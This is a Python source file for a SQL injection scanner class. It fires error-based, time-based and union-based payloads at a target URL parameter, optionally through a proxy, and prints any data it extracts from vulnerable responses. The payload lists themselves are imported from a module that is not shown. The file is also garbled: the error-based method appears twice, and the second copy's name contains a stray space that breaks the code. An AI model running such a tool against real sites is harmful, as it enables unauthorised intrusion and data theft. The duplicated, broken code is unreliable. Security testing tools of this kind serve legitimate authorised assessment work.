import requests
import time
from payloads import ERROR_BASED_PAYLOADS, TIME_BASED_PAYLOADS, UNION_BASED_PAYLOADS
from utils import check_vulnerability, check_time_based, extract_data
from colorama import Fore

class Scanner:
    def __init__(self, url, parameter, proxy=None):
        self.url = url
        self.parameter = parameter
        self.proxy = proxy
        self.session = requests.Session()
        if self.proxy:
            self.session.proxies = {'http': self.proxy, 'https': self.proxy}

    def run_error_based(self):
        print("Running error-based SQL injection scan...")
        for payload in ERROR_BASED_PAYLOADS:
            print(f"Testing payload: {payload}")
            response = self.session.get(self.url, params={self.parameter: payload})

            if check_vulnerability(response):
                print(Fore.GREEN + f"Potential error-based vulnerability found with payload: {payload}")
                sensitive_data = extract_data(response)
                if sensitive_data:
                    print(Fore.GREEN + "Extracted data:", sensitive_data)
                break
        else:
            print(Fore.RED + "No error-based vulnerabilities found.")

    def run _error_based(self):
        print("Running error-based SQL injection scan...")
        for payload in ERROR_BASED_PAYLOADS:
            print(f"Testing payload: {payload}")
            response = self.session.get(self.url, params={self.parameter: payload})

            if check_vulnerability(response):
                print(Fore.GREEN + f"Potential error-based vulnerability found with payload: {payload}")
                sensitive_data = extract_data(response)
                if sensitive_data:
                    print(Fore.GREEN + "Extracted data:", sensitive_data)
                break
        else:
            print(Fore.RED + "No error-based vulnerabilities found.")

    def run_time_based(self):
        print("Running time-based SQL injection scan...")
        for payload in TIME_BASED_PAYLOADS:
            print(f"Testing payload: {payload}")
            start_time = time.time()
            response = self.session.get(self.url, params={self.parameter: payload})
            end_time = time.time()

            if check_time_based(start_time, end_time, threshold=5):  # Check if response time exceeds 5 seconds
                print(Fore.GREEN + f"Potential time-based vulnerability found with payload: {payload}")
                break
        else:
            print(Fore.RED + "No time-based vulnerabilities found.")

    def run_union_based(self):
        print("Running union-based SQL injection scan...")
        for payload in UNION_BASED_PAYLOADS:
            print(f"Testing payload: {payload}")
            response = self.session.get(self.url, params={self.parameter: payload})

            if check_vulnerability(response):
                print(Fore.GREEN + f"Potential union-based vulnerability found with payload: {payload}")
                sensitive_data = extract_data(response)
                if sensitive_data:
                    print(Fore.GREEN + "Extracted data:", sensitive_data)
                break
        else:
            print(Fore.RED + "No union-based vulnerabilities found.")